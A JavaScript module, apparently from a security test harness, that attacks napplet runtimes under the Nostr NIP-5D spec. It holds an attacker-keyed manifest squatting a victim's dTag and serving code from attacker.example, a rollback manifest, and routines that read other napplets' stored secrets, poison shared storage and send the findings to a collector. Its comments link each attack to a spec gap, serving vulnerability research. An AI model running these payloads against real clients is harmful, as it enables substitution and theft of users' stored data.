// evil-05 — Nostr-level substitution (tier 2). NIP-5D says the runtime must
// "resolve the napplet manifest event and verify its signature" — but never
// binds a named napplet (kind 35129 / replaceable 15129) to WHOSE key, nor
// says how storage namespaces key. This artifact is the substituted heir:
// it runs where the victim used to, and looks for its inheritance.
window.__EVIL_KIT__ = [
  {
    label: 'attacker-keyed manifest squatting the victim dTag',
    note: 'NIP-5D never binds a named napplet (35129) to a publisher. A runtime resolving by dTag alone accepts whichever manifest a relay serves first — attacker publishes this from their own key and SUBSTITUTES the napplet. Verify the publisher pubkey out-of-band or pin it.',
    data: {
      kind: 35129,
      pubkey: 'ATTACKER_PUBKEY_HEX',
      content: 'A feed viewer and editor hosted on Nostr (totally the real one)',
      tags: [
        ['d', 'legit-napplet-dtag-squatted'],
        ['x', '186ea5fd14e88fd1ac49351759e7ab906fa94892002b60bf7f5a428f28ca1c99'],
        ['server', 'https://attacker.example/blossom'],
      ],
    },
  },
  {
    label: 'rollback / replay manifest (old created_at)',
    note: 'kind 15129/35129 are replaceable and NIP-5D has no freshness rule (latest? created_at pinning? last-known-good?). A hostile relay serves an OLD version of this manifest — pin known versions or require freshness windows.',
    data: {
      kind: 15129,
      created_at: 1234567890,
      content: 'an old, previously-valid version — rolled back on you',
      tags: [
        ['x', '186ea5fd14e88fd1ac49351759e7ab906fa94892002b60bf7f5a428f28ca1c99'],
        ['server', 'https://attacker.example/blossom'],
      ],
    },
  },
];

const ATTACKS = [
  {
    id: 'inherited-storage',
    name: 'storage namespace inheritance',
    target: 'storage namespacing is unspecified in NIP-5D (NAP-STORAGE)',
    severity: 'critical',
    harm: 'If the runtime namespaces storage by dTag (or globally, or across versions of one napplet), a substituted napplet INHERITS the victim\'s stored user data, and a version bump inherits its predecessor\'s secrets. Data theft with no escape needed — the runtime hands it over.',
    evilBrief: 'Exfiltrates whatever stored secrets are visible through the injected storage namespace (the inherited __evil05_secret__ plus any keys present) to the collector, then writes __evil05_poison__ into the namespace for the NEXT heir to inherit.',
    async demo() {
      const st = window.napplet && window.napplet.storage;
      if (!st) return na('no injected storage domain — no namespace to inherit (inheritance channel absent, nothing to steal)');
      try {
        const v = await withTimeout(st.get('__evil05_secret__'), 3000);
        if (v && v !== 'timeout' && !(v && v.__rejected)) {
          return armed('INHERITED ' + JSON.stringify(mask(v, 24)) + ' from a PREDECESSOR/VICTIM namespace — storage is shared across artifact identity: substitution = full stored-data theft');
        }
        return blocked('namespace is isolated — no inherited secret visible (storage bound to artifact identity, substitution gains nothing)');
      } catch (e) {
        const m = errMsg(e);
        if (/no such|not found|timeout/i.test(m)) {
          return blocked('namespace is isolated — no inherited secret visible (storage bound to artifact identity)');
        }
        return na('storage error: ' + m);
      }
    },
    async evil() {
      const st = window.napplet && window.napplet.storage;
      const out = {};
      if (!st) { out.error = 'no injected storage domain'; return out; }
      const keys = [];
      try {
        const secret = await withTimeout(st.get('__evil05_secret__'), 3000);
        if (secret && secret !== 'timeout' && !secret.__rejected) {
          out.inheritedSecret = String(secret);
          keys.push('__evil05_secret__');
        }
      } catch (e) { out.getError = errMsg(e); }
      try {
        await st.set('__evil05_poison__', 'attacker-data-for-the-next-heir');
        out.poisoned = '__evil05_poison__ written into the shared namespace — the NEXT napplet version (or the returned legit napplet) inherits it';
      } catch (e) { out.setError = errMsg(e); }
      out.exfil = await sendToCollector('substitution-inheritance', { inherited: out.inheritedSecret || null, keys: keys });
      return out;
    },
  },
  {
    id: 'cross-namespace-read',
    name: 'cross-namespace read probe',
    target: 'namespace policy: dTag vs (dTag, artifactHash) vs global',
    severity: 'critical',
    harm: 'A GLOBAL or dTag-only namespace lets any napplet read any napplet\'s data — full cross-napplet disclosure.',
    async demo() {
      const st = window.napplet && window.napplet.storage;
      if (!st) return na('no injected storage domain');
      const markers = ['__evil03_spoof_trap__', '__evil04_kit_xss__', '__evil05_cross__'];
      const found = [];
      for (const k of markers) {
        try {
          const v = await withTimeout(st.get(k), 1200);
          if (v && v !== 'timeout' && !v.__rejected) found.push(k + '=' + mask(v, 12));
        } catch (_) { /* not visible */ }
      }
      return found.length
        ? armed('read keys belonging to OTHER napplets\' namespaces: ' + found.join(', ') + ' — namespace leaks across napplet identities')
        : blocked('no cross-namespace keys visible — namespaces hold (at least on this key set)');
    },
    async evil() {
      const st = window.napplet && window.napplet.storage;
      const out = { found: [] };
      if (!st) { out.error = 'no injected storage domain'; return out; }
      for (const k of ['__evil05_secret__', '__evil06_seeded__', '__harness_canary__']) {
        try {
          const v = await withTimeout(st.get(k), 1500);
          if (v && v !== 'timeout' && !v.__rejected) out.found.push({ key: k, value: mask(v, 32) });
        } catch (_) { /* skip */ }
      }
      out.exfil = await sendToCollector('cross-namespace-read', out.found);
      return out;
    },
  },
  {
    id: 'dtag-unbound',
    name: 'dTag resolution binding',
    target: '"Resolve the napplet manifest event (…5129/15129/35129…) and verify its signature"',
    severity: 'critical',
    harm: 'The clause never says WHOSE signature. A runtime resolving by dTag (or accepting any valid event for the d) accepts an attacker-keyed manifest — the attacker becomes the napplet. This frame cannot see resolution from inside; this is a shell-side kit attack.',
    async demo() {
      return na('unverifiable from inside the frame — resolution happens shell-side before load. Use the kit: publish the attacker-keyed manifest from your own key with this dTag, point a by-dTag-resolving runtime at it, and see what loads');
    },
    async evil() {
      const out = { note: 'no in-frame payload: dTag binding is a shell-side flaw. The kit manifest substitutes this napplet wherever resolution is unbound' };
      out.exfil = await sendToCollector('substitution-claim', { dTag: window.__EVIL_ID__, href: safeGet(() => location.href) });
      return out;
    },
  },
];